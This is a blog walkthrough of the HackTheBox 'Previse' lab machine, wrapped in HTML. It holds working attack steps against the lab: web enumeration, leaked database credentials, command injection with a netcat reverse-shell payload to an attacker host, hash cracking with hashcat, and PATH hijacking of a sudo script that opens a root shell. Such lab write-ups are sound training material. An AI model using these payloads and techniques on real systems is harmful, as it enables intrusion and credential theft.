@@ -1,0 +1,131 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="PREVISE (Linux) Walkthrough  ENUMERATION MACHINE IP export IP=10.10.11.104NMAP SCAN RESULTS PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Enumerating Web Contents  Using gobuster to find the directories  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/ -t 100 -x php,txt,js,html,jpg -q Directories Found  /download.php (Status: 200) [Size: 2224]/login.php (Status: 200) [Size: 2224]/index.php (Status: 200) [Size: 2224]/files.php (Status: 200) [Size: 2224]/nav."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-previse/><title>HackTheBox: Previse :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Previse"><meta itemprop=description content="PREVISE (Linux) Walkthrough  ENUMERATION MACHINE IP export IP=10.10.11.104NMAP SCAN RESULTS PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Enumerating Web Contents  Using gobuster to find the directories  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/ -t 100 -x php,txt,js,html,jpg -q Directories Found  /download.php (Status: 200) [Size: 2224]/login.php (Status: 200) [Size: 2224]/index.php (Status: 200) [Size: 2224]/files.php (Status: 200) [Size: 2224]/nav."><meta itemprop=datePublished content="2022-05-25T00:00:00+00:00"><meta itemprop=dateModified content="2022-05-25T00:00:00+00:00"><meta itemprop=wordCount content="698"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Previse"><meta name=twitter:description content="PREVISE (Linux) Walkthrough  ENUMERATION MACHINE IP export IP=10.10.11.104NMAP SCAN RESULTS PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Enumerating Web Contents  Using gobuster to find the directories  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/ -t 100 -x php,txt,js,html,jpg -q Directories Found  /download.php (Status: 200) [Size: 2224]/login.php (Status: 200) [Size: 2224]/index.php (Status: 200) [Size: 2224]/files.php (Status: 200) [Size: 2224]/nav."><meta property="og:title" content="HackTheBox: Previse"><meta property="og:description" content="PREVISE (Linux) Walkthrough  ENUMERATION MACHINE IP export IP=10.10.11.104NMAP SCAN RESULTS PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Enumerating Web Contents  Using gobuster to find the directories  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/ -t 100 -x php,txt,js,html,jpg -q Directories Found  /download.php (Status: 200) [Size: 2224]/login.php (Status: 200) [Size: 2224]/index.php (Status: 200) [Size: 2224]/files.php (Status: 200) [Size: 2224]/nav."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-previse/"><meta property="article:published_time" content="2022-05-25T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-25T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-05-25 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>S3cur!ty_Bl0g</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-previse/>HackTheBox: Previse</a></h2><div class=post-content><h1 id=previse-linux-walkthrough>PREVISE (Linux) Walkthrough</h1><hr><h1 id=enumeration>ENUMERATION</h1><h3 id=machine-ip>MACHINE IP</h3><pre><code>export IP=10.10.11.104
+</code></pre><h3 id=nmap-scan-results>NMAP SCAN RESULTS</h3><pre><code>PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+</code></pre><h3 id=enumerating-web-contents>Enumerating Web Contents</h3><ul><li>Using gobuster to find the directories</li></ul><pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.11.104/ -t 100 -x php,txt,js,html,jpg  -q
+</code></pre><ul><li>Directories Found</li></ul><pre><code>/download.php         (Status: 200) [Size: 2224]
+/login.php            (Status: 200) [Size: 2224]
+/index.php            (Status: 200) [Size: 2224]
+/files.php            (Status: 200) [Size: 2224]
+/nav.php              (Status: 200) [Size: 1248]
+/header.php           (Status: 200) [Size: 980] 
+/footer.php           (Status: 200) [Size: 217] 
+/css                  (Status: 200) [Size: 939] 
+/status.php           (Status: 200) [Size: 2224]
+/js                   (Status: 200) [Size: 1155]
+/logout.php           (Status: 200) [Size: 2224]
+/accounts.php         (Status: 200) [Size: 2224]
+/config.php           (Status: 200) [Size: 0]   
+/logs.php             (Status: 200) [Size: 2224]
+
+</code></pre><ul><li><p>A little more analysis from Burp or by active scan can found the contents of these pages which are being redirect to <code>/login.php</code></p></li><li><p>Retrive the contents of <code>/accounts.php</code></p></li><li><p>You should be able to make a request to create a account</p></li><li><p>REQUEST TO CREATE ACCOUNT (Can be Figure out using BURP)</p></li></ul><pre><code>POST /accounts.php HTTP/1.1
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://10.10.11.104
+Connection: close
+Referer: http://10.10.11.104/site.webmanifest/
+Cookie: PHPSESSID=rk9dphd6i16kl9rvg6c98mc7lf
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=admin&amp;password=testpass&amp;confirm=testpass&amp;submit=
+
+</code></pre><ul><li><p>Now we can Login to this account and can further enumerate the web panel</p></li><li><p>We found Some source code Backup at</p></li></ul><pre><code>http://10.10.11.104/files.php
+</code></pre><ul><li><p>These source code backup was uploaded by User <code>newguy</code></p></li><li><p>Downloading and Extract Gives a Lot of files to look for</p></li><li><p>Found Some Juicy content in <code>config.php</code></p></li></ul><pre><code>&lt;?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+?&gt;
+
+
+</code></pre><ul><li><p>These may also be the user credentials</p></li><li><p>Let&rsquo;s try SSh, with below details</p></li><li><p>NOT WORKED</p></li></ul><hr><h2 id=getting-reverse-shell>GETTING REVERSE SHELL</h2><ul><li><p>Lets Read the Source Code files.</p></li><li><p>In file <code>/logs.php</code> we can see a line, which is being executed using python script</p></li></ul><pre><code>$output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}&quot;);
+
+</code></pre><ul><li>So we can use a payload like</li></ul><pre><code>delim=hello;nc -e /bin/sh 10.10.14.2 4444
+
+</code></pre><ul><li>Original Request</li></ul><pre><code>POST /logs.php HTTP/1.1
+Host: 10.10.11.104
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Origin: http://10.10.11.104
+Connection: close
+Referer: http://10.10.11.104/site.webmanifest/
+Cookie: PHPSESSID=rk9dphd6i16kl9rvg6c98mc7lf
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+delim=hello1111%26nc+-e+/bin/sh+10.10.14.2+4444
+
+</code></pre><ul><li>This should get us reverse shell</li></ul><pre><code>nc -lvp 4444
+
+</code></pre><ul><li>Stablizing the Netcat Reverse Shell</li></ul><pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+export TERM=xterm
+
+PRESS CTRL + Z ( To Background the shell)
+
+stty raw -echo
+
+fg (to foreground the shell)
+
+</code></pre><hr><h2 id=user-flag>USER FLAG</h2><ul><li><p>We currently do not have access to the user <code>m4lwhere</code> files</p></li><li><p>We will have to find some way to read <code>user.txt</code></p></li><li><p>Let&rsquo;s find out what is inside the SQL DATABASE using above found credentials</p></li></ul><pre><code>    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+
+</code></pre><ul><li>Use Below Command to see the DATA from sql database</li></ul><pre><code>USE premise
+
+SHOW TABLES
+
+SELECT  * FROM  accounts;
+
+</code></pre><ul><li>Data We Found is encrypted</li></ul><pre><code>m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+admin:$1$🧂llol$FbsumqZUt.kJRCYaWurtw0
+
+</code></pre><ul><li>Cracking the Passwords using HASHCAT</li></ul><pre><code>hashcat -a 3 -m 500 encrypted-creds.txt /usr/share/wordlists/rockyou.txt
+
+</code></pre><ul><li>Password Found</li></ul><pre><code>m4lwhere:ilovecody112235!
+
+</code></pre><ul><li>SSH into the <code>m4lwhere</code> account</li></ul><pre><code>ssh m4lwhere@10.10.11.104
+
+</code></pre><ul><li>We can find the User Flag Here <code>/home/w4lwhere/user.txt</code></li></ul><hr><h2 id=priviledge-escalation>PRIVILEDGE ESCALATION</h2><ul><li>Lets Find the allowed files to run as root</li></ul><pre><code>sudo -l
+
+</code></pre><ul><li>We found below script is allowed to run as root</li></ul><pre><code>/opt/scripts/access_backup.sh
+
+</code></pre><ul><li>Contents of File</li></ul><pre><code>
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
+
+
+</code></pre><ul><li><p>Here <code>gzip</code> is using <code>PATH Variables</code> to execute the gzip command</p></li><li><p>We can Add our own path and create a <code>gzip</code> file which will be executed in place of original gzip. (LINUX PRIVILEDGE ESCALATION USING PATH VARIABLE)</p></li></ul><pre><code>export PATH=/tmp:$PATH
+echo $PATH
+cd /tmp
+echo &quot;nc -e /bin/bash 10.10.14.2 4444&quot; &gt; gzip
+chmod 777 gzip
+sudo /opt/scripts/access_backup.sh
+</code></pre><ul><li>Along Side Create a netcat listener to receive the reverse shell</li></ul><pre><code>nc -lnvp 4444
+
+</code></pre><ul><li><p>We Should Have got the root shell.</p></li><li><p>Check <code>/root/root.txt</code> for ROOT Flag.</p></li></ul><hr><h3 id=previse-has-been-pwned>PREVISE HAS BEEN PWNED</h3></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>
